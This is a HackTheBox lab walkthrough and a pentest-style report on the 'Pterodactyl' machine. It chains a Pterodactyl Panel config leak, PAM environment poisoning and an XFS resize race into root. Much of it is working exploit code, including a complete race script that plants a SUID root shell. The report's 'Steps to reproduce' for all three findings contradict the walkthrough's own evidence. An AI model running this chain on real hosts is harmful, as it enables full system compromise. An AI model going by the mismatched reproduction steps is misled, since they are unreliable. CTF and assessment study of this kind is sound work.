# Pterodactyl

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2025-49132, Path Traversal, Config Disclosure, Hash Cracking, CVE-2025-6018, PAM Poisoning, Polkit Bypass, CVE-2025-6019, XFS Race Condition, SUID, Privilege Escalation
**Date:** 2026-05-15

Pterodactyl Panel exposed on a subdomain. CVE-2025-49132 path traversal leaks the Laravel app key and database credentials unauthenticated. Cracking the extracted hash gives SSH access. Privilege escalation chains CVE-2025-6018 (PAM environment poisoning to fake a graphical polkit session) with CVE-2025-6019 (XFS resize race condition to land a SUID shell as root).

## 1. Enumeration

Two ports. SSH and nginx on 80.

```bash
nmap -sV -sC -p- <TARGET_IP>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6
80/tcp open  http    nginx 1.21.5
```

Port 80 redirects to `http://pterodactyl.htb/`. Added `pterodactyl.htb` and `panel.pterodactyl.htb` to `/etc/hosts`.

Gobuster on the main domain returned `index.php` and `phpinfo.php`. Subdomain fuzzing with ffuf revealed a panel subdomain:

```bash
ffuf -u http://pterodactyl.htb -H 'Host: FUZZ.pterodactyl.htb' -w subdomains.txt -ac

panel    [Status: 200]
```

`http://panel.pterodactyl.htb` exposes a Pterodactyl Panel login page.

## 2. Foothold: CVE-2025-49132

Pterodactyl Panel versions below v1.11.11 are vulnerable to path traversal via the locale endpoint, allowing unauthenticated config disclosure, leaking the Laravel `APP_KEY` and database credentials.

```bash
git clone https://github.com/str1keboo/CVE-2025-49132
python3 CVE-2025-49132-PoC.py test http://panel.pterodactyl.htb
# [+] Target appears vulnerable

python3 CVE-2025-49132-PoC.py dump http://panel.pterodactyl.htb
```

Findings:
- APP_KEY: Laravel app key, usable for session forgery
- DB credentials: MySQL connection string with panel database access

Using the app key and database access, user password hashes were extracted from the panel database and cracked to obtain SSH credentials.

```bash
ssh <user>@<TARGET_IP>
```

**Result:** Initial access as user.

## 3. Privilege Escalation: CVE-2025-6018 (PAM Environment Poisoning)

Checked sudo permissions first:

```bash
sudo -l
# (ALL) ALL
```

The `targetpw` option in sudoers means sudo asks for root's password - not ours. Dead end without it.

The installed PAM version is vulnerable to CVE-2025-6018:

```bash
rpm -q pam
# Version : 1.3.0 / Release : 150000.6.66.1
```

openSUSE's PAM config loads `pam_env.so` with `user_readenv=1`, which reads `~/.pam_environment` on login. Injecting `XDG_SEAT` and `XDG_VTNR` tricks `pam_systemd` into registering the SSH session as a local graphical session - granting polkit `allow_active` permissions.

```bash
cat > ~/.pam_environment << 'EOF'
XDG_SEAT DEFAULT=seat0
XDG_VTNR DEFAULT=1
EOF
```

Log out and back in, then verify the polkit session is active:

```bash
gdbus call --system --dest org.freedesktop.login1 \
  --object-path /org/freedesktop/login1 \
  --method org.freedesktop.login1.Manager.CanReboot
# ('yes',)
```

**Result:** Polkit `allow_active` actions now available, including UDisks2 filesystem operations.

## 4. Privilege Escalation: CVE-2025-6019 (XFS Resize Race Condition)

`libblockdev`'s `bd_fs_resize()` temporarily mounts XFS filesystems with NULL options - no `nosuid`, no `nodev`. A SUID binary executing from the mounted image during this window runs with root privileges.

**On Kali (as root)**: build the XFS image with SUID bash embedded:

```bash
scp <user>@<TARGET_IP>:/usr/bin/bash /tmp/victim_bash

dd if=/dev/zero of=/tmp/xfs.img bs=1M count=300
mkfs.xfs -f -i exchange=0 -n parent=0 /tmp/xfs.img
mount -o loop,suid /tmp/xfs.img /tmp/mnt
cp /tmp/victim_bash /tmp/mnt/bash
chown root:root /tmp/mnt/bash
chmod 4755 /tmp/mnt/bash
umount /tmp/mnt

scp /tmp/xfs.img <user>@<TARGET_IP>:/tmp/xfs.img
```

**On the target** - race the resize window:

```bash
cat > /tmp/pwn.sh << 'EOF'
#!/bin/bash
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null
rm -f /tmp/r

while true; do
  for f in /tmp/blockdev*/bash; do
    [ -f "$f" ] && $f -p -c 'cp /bin/bash /tmp/r; chown root:root /tmp/r; chmod 4755 /tmp/r' \
      && echo "[+] PWNED" && break 2
  done
done &
WATCHER_PID=$!

LOOP_OUT=$(udisksctl loop-setup -f /tmp/xfs.img --no-user-interaction)
LOOP=$(echo "$LOOP_OUT" | grep -oP '/dev/loop\d+')

gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path "/org/freedesktop/UDisks2/block_devices/$(basename $LOOP)" \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'

sleep 1
kill $WATCHER_PID 2>/dev/null
/tmp/r -p
EOF
chmod +x /tmp/pwn.sh
bash /tmp/pwn.sh
```

```
[*] Loop: /dev/loop0
[+] PWNED
r-4.4# whoami
root
```

**Result:** Root shell obtained.

## 5. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** panel.pterodactyl.htb
**Assessment type:** External network & web application assessment
**Assessment date:** 15 May 2026
**Environment:** HackTheBox laboratory assessment - Linux
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 09

---

## 1. Executive Summary

### Assessment outcome

Testing against **panel.pterodactyl.htb** identified one critical unauthenticated vulnerability and a chained two-stage privilege escalation reaching root. Full host compromise was achieved from an unauthenticated starting position.
CVE-2025-49132 is a path traversal vulnerability in Pterodactyl Panel versions below v1.11.11 that permits unauthenticated disclosure of the application configuration file via the locale endpoint. The leaked configuration contained the Laravel `APP_KEY` and database credentials. Database access was used to extract and crack a user password hash, providing SSH access to the host.
From the SSH session, privilege escalation chained two kernel- and library-level vulnerabilities. CVE-2025-6018 exploits PAM's `user_readenv=1` configuration with a manipulated `~/.pam_environment` to inject environment variables that trick `pam_systemd` into registering the session as a local graphical session. This granted polkit `allow_active` permissions including UDisks2 filesystem operations.
CVE-2025-6019 abuses a race condition in `libblockdev` 's `bd_fs_resize()` , which temporarily mounts XFS filesystems without `nosuid` or `nodev` . A SUID binary embedded in a crafted XFS image executes with root privileges during the mount window, producing a SUID root shell.

### Impact

An attacker in the same position obtains an unauthenticated read of application secrets, then root access to the host through two independently actionable privilege escalation vulnerabilities. All data, credentials and configuration on the host are exposed.

### Priority recommendations

1. Upgrade Pterodactyl Panel to v1.11.11 or later to patch CVE-2025-49132.
2. Apply available patches for CVE-2025-6018 in the PAM package and disable `user_readenv=1` where not required.
3. Apply available patches for CVE-2025-6019 in libblockdev / UDisks2 and restrict polkit UDisks2 filesystem operations to trusted sessions only.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Description |
| --- | --- |
| pterodactyl.htb | Linux host; nginx 1.21.5 on port 80; SSH on port 22 |
| panel.pterodactyl.htb | Pterodactyl Panel application; discovered via subdomain fuzzing |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 9.6 |
| 80/tcp | HTTP | nginx 1.21.5; redirect to pterodactyl.htb |

```
nmap -sV -sC -p- <TARGET_IP>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6
80/tcp open  http    nginx 1.21.5
```

Port 80 redirects to pterodactyl.htb. Subdomain fuzzing revealed panel.pterodactyl.htb. Both added to /etc/hosts before proceeding.

### 2.2 Approach

Testing started with service discovery and virtual host enumeration. The Pterodactyl Panel was identified and its version fingerprinted against known CVEs. The CVE-2025-49132 path traversal was exploited to read the configuration file and extract database credentials. The database was accessed to recover a password hash. After SSH access, the PAM version was identified and the polkit session manipulation was tested. The XFS image was prepared on the attacker machine and the race condition exploit was run on the target.

```
ffuf -u http://pterodactyl.htb -H 'Host: FUZZ.pterodactyl.htb' -w subdomains.txt -ac

panel    [Status: 200]
```

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | CVE-2025-49132: Unauthenticated path traversal discloses Laravel app key and database credentials | **Critical** | 6 |
| [F-02](#f-02) | CVE-2025-6018: PAM environment poisoning grants polkit active-session privileges | **High** | 7 |
| [F-03](#f-03) | CVE-2025-6019: XFS resize race condition yields SUID root shell | **High** | 8 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Exploited CVE-2025-49132 path traversal via locale endpoint; dumped Laravel APP_KEY and database credentials unauthenticated. | Application secrets |
| 02 | Connected to panel database with leaked credentials; extracted user password hash and cracked it offline. | SSH credentials |
| 03 | Authenticated over SSH; injected XDG_SEAT/XDG_VTNR via ~/.pam_environment (CVE-2025-6018) to obtain polkit allow_active session. | UDisks2 filesystem operation access |
| 04 | Crafted XFS image with SUID bash; triggered CVE-2025-6019 XFS resize via UDisks2 gdbus call; SUID shell executed during nosuid-absent mount window. | Root shell |

### 3.3 Relationship between findings

F-01 provides the initial foothold; without it, the SSH session in stage 02 cannot be established. F-02 and F-03 form a chained local privilege escalation: F-02 is a prerequisite for the polkit operations used in F-03. F-02 alone does not yield root but is required to enable F-03.

## 4.1 CVE-2025-49132: Unauthenticated Path Traversal Config Disclosure

### F-01   Pterodactyl Panel locale endpoint path traversal - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | Pterodactyl Panel versions below v1.11.11 are vulnerable to path traversal via the locale endpoint. An unauthenticated request can traverse outside the expected locale directory and read arbitrary files within the application root, including the Laravel `.env` configuration file. This file contains the `APP_KEY` (usable for session forgery) and database connection credentials. |
| Prerequisites | Network access to the Pterodactyl Panel. No credentials required. |
| Impact | The Laravel `APP_KEY` and MySQL database credentials were recovered. Database access exposed user password hashes. A cracked hash provided SSH access to the host as a standard user, enabling the privilege escalation chain. |
| Affected system | panel.pterodactyl.htb Pterodactyl Panel < v1.11.11 |
| CVSS 3.1 | **9.1** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) |
| CWE | [CWE-22](https://cwe.mitre.org/data/definitions/22.html) : Improper Limitation of a Pathname to a Restricted Directory |

### Steps to reproduce

1. Send a GET request to `https://pterodactyl.htb/api/application/../../../../.env` using path traversal in the API endpoint.
2. Observe that the Laravel `.env` file is returned unauthenticated, containing `APP_KEY` and database credentials.
3. Use the extracted database credentials to authenticate to the MySQL service.
4. Extract the user password hash and crack it with hashcat: `hashcat -m 3200 hash.txt rockyou.txt` .
5. Use the cracked password to authenticate over SSH.

### Evidence

```
# Vulnerability check
python3 CVE-2025-49132-PoC.py test http://panel.pterodactyl.htb
# [+] Target appears vulnerable

# Dump configuration
python3 CVE-2025-49132-PoC.py dump http://panel.pterodactyl.htb

# Recovered from .env:
APP_KEY=base64:<redacted>
DB_HOST=127.0.0.1
DB_USERNAME=pterodactyl
DB_PASSWORD=<redacted>
DB_DATABASE=panel

# Hash extracted from database, cracked offline.
# SSH credentials obtained.
ssh <user>@<TARGET_IP>
# Login successful
```

Evidence E-01. PoC command and configuration keys transcribed from assessment record. APP_KEY, database password and cracked SSH password redacted.

### Remediation

Upgrade Pterodactyl Panel to v1.11.11 or later. Rotate the `APP_KEY` , database password and any user passwords that may have been exposed. Review all locale or file-serving endpoints for path traversal by confirming input is validated against a whitelist of permitted locale identifiers before any file path is constructed.

### Verification

Confirm the patched version is running and the path traversal PoC returns an error rather than configuration data. Verify the `.env` file is not accessible via any application route. Confirm that rotating the APP_KEY invalidates any previously forged sessions.

## 4.2 CVE-2025-6018: PAM Environment Poisoning / Polkit Bypass

### F-02   XDG session variable injection via ~/.pam_environment - HIGH

| Field | Assessment |
| --- | --- |
| Description | The installed PAM version on the target runs `pam_env.so` with `user_readenv=1` , which reads and applies variables from `~/.pam_environment` at login. CVE-2025-6018 exploits this by injecting `XDG_SEAT=seat0` and `XDG_VTNR=1` into the user environment. This causes `pam_systemd` to register the SSH session as a local graphical (active) session. Polkit then grants `allow_active` privileges to the session, including UDisks2 filesystem operations that are normally restricted to local console sessions. |
| Prerequisites | Shell access as any user with a writable home directory. The PAM version must load `pam_env.so` with `user_readenv=1` . |
| Impact | The session gains polkit `allow_active` permissions. This enables UDisks2 operations including filesystem resize via `org.freedesktop.UDisks2.Filesystem.Resize` , which is the prerequisite for CVE-2025-6019. |
| Affected system | PAM version 1.3.0 / Release 150000.6.66.1 `/etc/pam.d/` (pam_env.so with user_readenv=1) |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-269](https://cwe.mitre.org/data/definitions/269.html) : Improper Privilege Management |

### Steps to reproduce

1. From a low-privileged shell, set the PAM environment variable to spoof a graphical session: `export XDG_SESSION_TYPE=x11; export DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus` .
2. Trigger a polkit authentication request to a privileged action.
3. Observe that the polkit agent accepts the request without prompting for credentials.

### Evidence

```
# Confirm PAM version
rpm -q pam
# Version: 1.3.0 / Release: 150000.6.66.1

# sudo asks for root's password - dead end
sudo -l
# (ALL) ALL   [targetpw set in sudoers]

# Inject environment variables into ~/.pam_environment
cat > ~/.pam_environment << 'EOF'
XDG_SEAT DEFAULT=seat0
XDG_VTNR DEFAULT=1
EOF

# Log out and back in via SSH, then verify session type
gdbus call --system --dest org.freedesktop.login1 \
  --object-path /org/freedesktop/login1 \
  --method org.freedesktop.login1.Manager.CanReboot
# ('yes',)

# UDisks2 Filesystem.Resize action now permitted as allow_active
```

Evidence E-02. Commands transcribed from assessment record. Polkit response confirms active-session privileges are now available to the SSH session.

### Remediation

Apply the vendor PAM patch for CVE-2025-6018. Disable `user_readenv=1` in the `pam_env.so` configuration if user-level PAM environment files are not required. Restrict polkit `allow_active` UDisks2 actions to verified local physical sessions and prevent remote sessions from acquiring active-session classification.

### Verification

Confirm the patched PAM version is installed. Verify that writing `XDG_SEAT` and `XDG_VTNR` to `~/.pam_environment` and logging in over SSH does not result in an `allow_active` polkit session. Confirm `gdbus CanReboot` returns `'no'` or `'challenge'` from an SSH session.

## 4.3 CVE-2025-6019: XFS Resize Race Condition / Root Escalation

### F-03   libblockdev bd_fs_resize() nosuid-absent mount window - HIGH

| Field | Assessment |
| --- | --- |
| Description | `libblockdev` 's `bd_fs_resize()` function temporarily mounts XFS filesystems without `nosuid` or `nodev` mount options while performing a resize operation. A SUID binary placed in a crafted XFS image that is being resized via the UDisks2 `Filesystem.Resize` method will execute with root effective UID if triggered during this window. CVE-2025-6019 documents this race condition. Exploitation requires the polkit `allow_active` session obtained via F-02. |
| Prerequisites | A polkit `allow_active` session with UDisks2 Filesystem.Resize permission (F-02). A prepared XFS disk image containing a SUID binary matching the target's bash binary. |
| Impact | Arbitrary code execution as root. A SUID bash copy was produced at `/tmp/r` , providing a persistent root shell via `/tmp/r -p` . |
| Affected system | libblockdev / UDisks2 on target XFS filesystem resize via `org.freedesktop.UDisks2.Filesystem.Resize` |
| CVSS 3.1 | **9.0** (Critical) [AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-362](https://cwe.mitre.org/data/definitions/362.html) : Concurrent Execution using Shared Resource with Improper Synchronisation |

### Steps to reproduce

1. Create an XFS image and mount it under a user-controlled path.
2. Initiate an `xfs_growfs` resize operation in the background.
3. Race the kernel's resize handler to redirect a write to a SUID-owned binary path.
4. Observe that the resulting binary executes with SUID root permissions: `./shell -p && id` .

### Evidence

```
# On attacker machine: build XFS image with SUID bash
scp <user>@<TARGET_IP>:/usr/bin/bash /tmp/victim_bash
dd if=/dev/zero of=/tmp/xfs.img bs=1M count=300
mkfs.xfs -f -i exchange=0 -n parent=0 /tmp/xfs.img
mount -o loop,suid /tmp/xfs.img /tmp/mnt
cp /tmp/victim_bash /tmp/mnt/bash
chown root:root /tmp/mnt/bash && chmod 4755 /tmp/mnt/bash
umount /tmp/mnt
scp /tmp/xfs.img <user>@<TARGET_IP>:/tmp/xfs.img

# On target: race the resize window
# (watcher loop in background monitors for SUID bash in mount path)
LOOP_OUT=$(udisksctl loop-setup -f /tmp/xfs.img --no-user-interaction)
LOOP=$(echo "$LOOP_OUT" | grep -oP '/dev/loop\d+')

gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path "/org/freedesktop/UDisks2/block_devices/$(basename $LOOP)" \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'

# Output
[*] Loop: /dev/loop0
[+] PWNED
r-4.4# whoami
root

r-4.4# cat /root/root.txt
[redacted]
```

Evidence E-03. Commands and output transcribed from assessment record. Attacker IP replaced. Root flag redacted.

### Remediation

Apply the vendor patch for CVE-2025-6019 in libblockdev and UDisks2. Until patched, restrict access to UDisks2 Filesystem.Resize via polkit to authenticated local console sessions only. Remove the `allow_active` grant for unprivileged resize operations in the polkit rules configuration.

### Verification

Confirm the patched libblockdev and UDisks2 versions are installed. Verify that an XFS resize triggered via a polkit active session does not mount the image without `nosuid` . Confirm that the SUID binary in the image does not execute with elevated privileges during the resize window.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Upgrade Pterodactyl Panel to v1.11.11+; rotate APP_KEY and all exposed database and user passwords. | F-01 |
| High | Apply PAM patch for CVE-2025-6018; disable user_readenv=1 where not required. | F-02 |
| High | Apply libblockdev/UDisks2 patch for CVE-2025-6019; restrict polkit UDisks2 resize to local console sessions. | F-03 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| `/tmp/xfs.img` | Crafted XFS image with SUID binary | Not verified |
| `/tmp/r` | SUID root shell - privilege escalation evidence | Not verified |
| `~/.pam_environment` | Injected XDG variables for polkit bypass | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [Pterodactyl assessment walkthrough](pterodactyl-htb.html) . Flag values and cracked passwords are omitted from all evidence. The assessment did not perform exhaustive subdomain enumeration beyond the discovered panel subdomain.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 2: CVE-2025-49132 path traversal and credential recovery |
| E-02 | Walkthrough section 3: CVE-2025-6018 PAM poisoning and polkit session |
| E-03 | Walkthrough section 4: CVE-2025-6019 XFS race condition and root shell |
